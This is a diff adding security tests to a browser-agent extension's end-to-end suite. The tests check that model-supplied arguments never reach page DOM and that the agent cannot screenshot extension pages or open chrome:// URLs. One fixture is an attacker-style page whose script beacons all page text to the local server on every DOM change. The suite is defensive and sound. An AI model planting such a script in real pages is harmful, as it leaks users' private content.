@@ -20,6 +20,12 @@ const extensionPath = path.resolve(process.env.PARCHI_E2E_EXTENSION || path.join
 const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'parchi-private-net-'));
 const SECRET = 'FIXTURE-PRIVATE-CONTENT';
 let exfilHits = 0;
+const beacons: string[] = [];
+// Attacker-style page: reports every DOM change (e.g. extension overlays) back to the fixture server.
+const OBSERVER_PAGE = `<p>observer</p><script>
+  new MutationObserver(() => navigator.sendBeacon('/beacon', document.documentElement.textContent || ''))
+    .observe(document.documentElement, { childList: true, subtree: true, characterData: true });
+</script>`;
 
 const server = http.createServer((req, res) => {
   const host = String(req.headers.host || '');
@@ -33,6 +39,17 @@ const server = http.createServer((req, res) => {
     exfilHits += 1;
     res.writeHead(204);
     res.end();
+  } else if (req.url === '/beacon') {
+    let body = '';
+    req.on('data', (chunk) => {
+      body += chunk;
+    });
+    req.on('end', () => beacons.push(body));
+    res.writeHead(204);
+    res.end();
+  } else if (req.url === '/observer') {
+    res.writeHead(200, { 'content-type': 'text/html' });
+    res.end(`<!doctype html><html><head><title>observer</title></head><body>${OBSERVER_PAGE}</body></html>`);
   } else if (req.url === '/nc') {
     res.writeHead(204); // a navigation response that never commits
     res.end();
@@ -151,6 +168,45 @@ try {
     afterNoCommit?.success === false,
     afterNoCommit,
   );
+
+  // 6. Model-chosen arguments must not be written into page DOM (overlay notes). The observer page stands in for an
+  // attacker page; it is approved only because every fixture host resolves to loopback.
+  sessionId = 'private-net-6';
+  await setSettings({ allowedPrivateHosts: `approved.example:${port},observer.example:${port}` });
+  const observerTab = await run('openTab', { url: `http://observer.example:${port}/observer` });
+  await settle();
+  await run('openTab', { url: `http://approved.example:${port}/secret-approved` });
+  await settle();
+  const sentinel = 'SENTINEL-FROM-PRIVATE-READ';
+  const tabId = observerTab?.tabId;
+  await run('getContent', { tabId, selector: `#${sentinel}` });
+  await run('findHtml', { tabId, selector: `.${sentinel}` });
+  await run('waitFor', { tabId, text: sentinel, timeoutMs: 300 });
+  await run('navigate', { tabId, url: `http://approved.example:${port}/plain?q=${sentinel}` });
+  await settle();
+  check(
+    'overlays still reach the page (positive control)',
+    beacons.some((b) => b.includes('Read page')),
+    {
+      beacons: beacons.length,
+    },
+  );
+  check('no model-supplied text appears in page DOM or beacons', !beacons.some((b) => b.includes(sentinel)), {
+    leaked: beacons.filter((b) => b.includes(sentinel)).length,
+  });
+
+  // 7. Browser/extension pages are not agent destinations: no chrome:// navigation, no screenshot of extension UI.
+  await panel.bringToFront(); // the visible tab is now the extension's own page
+  await settle();
+  const extensionShot = await run('screenshot', { tabId });
+  check(
+    'screenshot of a visible extension page is refused',
+    extensionShot?.success === false && !extensionShot?.dataUrl,
+    extensionShot,
+  );
+  sessionId = 'private-net-7'; // fresh, untainted session: only the scheme rule can refuse this
+  const toChrome = await run('openTab', { url: 'chrome://version' });
+  check('opening chrome:// is refused', toChrome?.success === false, toChrome);
 } finally {
   await context.close();
   server.close();
